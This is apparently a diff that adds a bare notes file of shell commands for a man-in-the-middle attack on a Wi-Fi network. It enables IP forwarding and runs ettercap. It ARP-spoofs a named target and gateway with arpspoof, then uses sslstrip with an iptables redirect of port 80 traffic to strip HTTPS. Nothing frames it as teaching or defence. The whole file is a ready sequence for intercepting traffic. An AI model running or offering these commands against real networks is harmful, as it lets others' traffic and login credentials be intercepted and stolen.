@@ -1,0 +1,28 @@
+
+use iptables:
+nano /etc/ettercap/etter.conf
+
+echo 1 > /proc/sys/net/ipv4/ip_forward
+
+
+
+ettercap -T -q -i wlan0 
+
+sslstrip -a -k -f
+
+                       # targt       Geteway
+arpspoof -i wlan0 -t 192.168.43.40 192.168.43.1
+
+
+iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-ports 10000
+
+
+
+
+
+
+
+
+
+
+
